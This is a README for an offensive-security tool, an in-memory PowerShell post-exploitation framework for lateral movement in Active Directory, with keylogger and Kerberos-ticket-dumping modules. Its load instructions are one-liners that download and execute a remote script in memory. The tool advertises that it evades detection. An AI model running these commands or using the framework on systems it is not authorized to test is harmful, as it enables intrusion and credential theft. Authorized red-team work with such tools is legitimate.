![Amnesiac3](https://github.com/Leo4j/Amnesiac/assets/61951374/f99be249-3270-4c92-ab27-516d2b8db7a3)
![279440077-678ce24e-70c4-47b1-b595-ca0835ba35d9](https://github.com/Leo4j/Amnesiac/assets/61951374/067080b7-b115-41e4-994e-60c0335c05dc)

# Amnesiac

`Amnesiac` is a post-exploitation framework designed to assist with lateral movement within active directory environments.

Amnesiac is being developed to bridge a gap on Windows OS, where post-exploitation frameworks are not readily available unless explicitly installed. In fact, it is entirely written in PowerShell, and can be loaded and executed in memory, just like any other PowerShell script.

If you find Amnesiac valuable and you like this project, please consider giving us a star on GitHub. Your support motivates the developer to continue improving and maintaining this project.

Please read the documentation to get the best out of Amnesiac: https://leo4j.gitbook.io/amnesiac/

## Load and run

```
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Amnesiac/main/Amnesiac.ps1');Amnesiac
```

If you need to run Amnesiac through a shell, use Amnesiac_ShellReady.ps1 | No colors, shell compatible

```
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Amnesiac/refs/heads/main/Amnesiac_ShellReady.ps1');Amnesiac
```

## Key Features 

### Command Execution over Named-Pipes (SMB)

Amnesiac sends commands and receives outputs through Named Pipes, ensuring discreet and efficient post-exploitation activities.

### No Installation Required

Unlike traditional frameworks, Amnesiac does not require installation. It operates entirely in memory, reducing the risk of detection and forensic footprint.

### User-Friendly Framework

Amnesiac is designed with usability in mind. It provides a user-friendly interface, making it accessible and efficient for both beginners and experienced users.

### Versatile Post-Exploitation Modules

Amnesiac comes equipped with an array of post-exploitation modules, ranging from keyloggers to Kerberos ticket dumping tools. These modules can be seamlessly integrated into your testing and assessment workflows.

### Acknowledgments

Amnesiac relies on few other projects for its modules. In each module, you'll find reference link information, ensuring proper attribution to the original creators.

### Support and Contributions

Contributions and feedback from the community are highly encouraged and appreciated.

### Preview

Watch on YouTube :point_down:

[![Watch the video](https://img.youtube.com/vi/xwHjKKtqAD4/maxresdefault.jpg)](https://youtu.be/xwHjKKtqAD4)

![image](https://github.com/Leo4j/Amnesiac/assets/61951374/895add16-3775-4f9e-9fef-b21739f206e0)

### License

Amnesiac is distributed under the GPL-3.0 License. Please review the license for details on usage and redistribution.

### Disclaimer

**Amnesiac is intended exclusively for research, education, and authorized testing. Its purpose is to assist professionals and researchers in identifying vulnerabilities and enhancing system security.**

**Users must secure explicit, mutual consent from all parties involved before utilizing this tool on any system, network, or digital environment, as unauthorized activities can lead to serious legal consequences. Users are responsible for adhering to all applicable laws and regulations related to cybersecurity and digital access.**

**The creator of Amnesiac disclaims liability for any misuse or illicit use of the tool and is not responsible for any resulting damages or losses.**

**THE SOFTWARE IS PROVIDED “AS IS,” WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE, AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES, OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT, OR OTHERWISE, ARISING FROM, OUT OF, OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.**

